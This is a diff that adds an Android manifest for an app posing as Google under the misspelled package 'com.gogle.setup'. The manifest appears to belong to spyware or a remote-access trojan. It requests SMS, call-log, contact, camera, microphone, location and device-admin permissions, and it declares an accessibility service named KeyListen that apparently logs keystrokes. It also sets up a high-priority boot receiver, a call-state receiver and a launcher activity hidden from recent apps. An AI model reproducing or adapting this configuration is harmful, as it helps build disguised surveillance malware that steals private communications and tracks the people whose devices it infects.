@@ -1,0 +1,70 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="10" android:versionName="1.3.3" package="com.gogle.setup" android:installLocation="auto">
+  <uses-sdk android:minSdkVersion="16" android:targetSdkVersion="28" />
+  <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+  <uses-permission android:name="android.permission.WAKE_LOCK" />
+  <uses-permission android:name="android.permission.INTERNET" />
+  <uses-permission android:name="android.accessibilityservice.AccessibilityService" />
+  <uses-permission android:name="android.permission.CAMERA" />
+  <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+  <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+  <uses-permission android:name="android.provider.Telephony.READ_SMS" />
+  <uses-permission android:name="android.permission.READ_CALL_LOG" />
+  <uses-permission android:name="android.permission.READ_SMS" />
+  <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+  <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
+  <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+  <uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS" />
+  <uses-permission android:name="android.permission.ACCESS_MOCK_LOCATION" />
+  <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+  <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+  <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+  <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+  <uses-permission android:name="android.permission.RECORD_AUDIO" />
+  <uses-permission android:name="android.permission.READ_CONTACTS" />
+  <uses-permission android:name="android.permission.WRITE_CONTACTS" />
+  <uses-permission android:name="android.permission.VIBRATE" />
+  <uses-permission android:name="android.permission.FLASHLIGHT" />
+  <uses-permission android:name="android.permission.SET_WALLPAPER" />
+  <uses-permission android:name="android.permission.BATTERY_STATS" />
+  <uses-permission android:name="android.permission.CALL_PHONE" />
+  <uses-permission android:name="android.permission.SEND_SMS" />
+  <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+  <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
+  <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+  <uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT" />
+  <uses-feature android:name="android.hardware.camera" />
+  <uses-feature android:name="android.hardware.camera.autofocus" />
+  <application android:allowBackup="true" android:label="@string/app_name" android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen" android:icon="@mipmap/icon" android:name="android.app.Application">
+    <receiver android:directBootAware="true" android:enabled="true" android:exported="true" android:name="crc64bef6148cb56f42c9.BootReceiver">
+      <intent-filter android:priority="1000">
+        <action android:name="android.intent.action.BOOT_COMPLETED" />
+      </intent-filter>
+    </receiver>
+    <receiver android:name="izci.AdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN">
+      <meta-data android:name="android.app.device_admin" android:resource="@layout/admin" />
+      <intent-filter>
+        <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+        <action android:name="android.intent.action.MAIN" />
+      </intent-filter>
+    </receiver>
+    <service android:label="@string/app_name" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:name="crc646c638bcfc2425995.KeyListen">
+      <intent-filter>
+        <action android:name="android.accessibilityservice.AccessibilityService" />
+      </intent-filter>
+    </service>
+    <receiver android:enabled="true" android:exported="true" android:name="crc646c638bcfc2425995.PhonecallReceiver">
+      <intent-filter>
+        <action android:name="android.intent.action.PHONE_STATE" />
+      </intent-filter>
+    </receiver>
+    <activity android:excludeFromRecents="true" android:icon="@mipmap/icon" android:label="@string/app_name" android:name="crc646c638bcfc2425995.MainActivity">
+      <intent-filter>
+        <action android:name="android.intent.action.MAIN" />
+        <category android:name="android.intent.category.LAUNCHER" />
+      </intent-filter>
+    </activity>
+    <service android:name="crc646c638bcfc2425995.ForegroundService" />
+    <provider android:name="mono.MonoRuntimeProvider" android:exported="false" android:initOrder="1999999999" android:directBootAware="true" android:authorities="com.gogle.setup.mono.MonoRuntimeProvider.__mono_init__" />
+  </application>
+</manifest>
